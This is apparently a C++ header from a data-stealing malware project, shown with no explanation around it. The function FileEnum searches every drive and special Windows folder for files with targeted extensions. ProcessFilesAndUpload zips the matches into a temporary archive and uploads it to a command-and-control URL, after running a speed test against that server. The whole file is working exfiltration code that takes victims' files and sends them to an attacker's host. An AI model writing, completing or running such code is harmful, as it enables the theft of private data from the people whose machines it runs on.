#pragma once
#define NOMINMAX

#include <iostream>
#include <fstream>

#include "json.hpp"
#include "../Communication/senddata.hpp"
#include "helpers.hpp"
#include "zipping.hpp"
#include "names.hpp"
#include "file_search.hpp"


std::map<std::string, std::map<std::string, std::string>> FileEnum() {
    std::vector<std::wstring> DIR_PATHS;
    std::map<std::string, std::map<std::string, std::string>> FILE_PATHS;

    std::vector<std::wstring> drives = Disk_ID();
    std::vector<std::wstring> specialDirs = GetSpecialPaths();
    DIR_PATHS.insert(DIR_PATHS.end(), drives.begin(), drives.end());
    DIR_PATHS.insert(DIR_PATHS.end(), specialDirs.begin(), specialDirs.end());

    for (const auto& PATH : DIR_PATHS) {
        std::map<std::string, std::map<std::string, std::string>> tempResults;
        std::wcout << L"Directory Path: " + PATH << std::endl;
        tempResults = FileSearcher(PATH, FILE_EXTS);

        // Append tempResults to FILE_PATHS
        FILE_PATHS.insert(tempResults.begin(), tempResults.end());
    }

    return FILE_PATHS;
}


void ProcessFilesAndUpload(std::wstring C2URL) {
    std::string tmpDir = TmpPath();
    std::map<std::string, std::map<std::string, std::string>> results = FileEnum();

    // read paths from results and save them to filesToZip 
    std::vector<std::wstring> filesToZip;
    for (const auto& [filePath, attributes] : results) {
        filesToZip.push_back(std::wstring(filePath.begin(), filePath.end()));
    }

    // If there are no files to zip, then return back to caller:
    if (filesToZip.empty()) {
        std::cerr << "No files to zip." << std::endl;
        return;
    }

    // Zip the files
    std::wstring zipDest = std::wstring(tmpDir.begin(), tmpDir.end()) + L"zipped.zip";
    std::string zipDestStr = WStringToString(zipDest);
    int zipResult = ZipFiles(zipDest, filesToZip);
    if (zipResult != ZIP_SUCCESS) {
        std::cerr << "There was an error zipping the files." << std::endl;
        return;
    }

    // === UPLOADING PROCESS BEGINS HERE ===
    std::wstring URL = C2URL + UPLOADPATH;
    std::wstring SPEEDTESTURL = C2URL + SPEEDTESTPATH;
    std::cout << "Begining file upload..." << std::endl;
    UploadFile(URL, zipDestStr, SPEEDTESTURL);
    Sleep(2000);
}

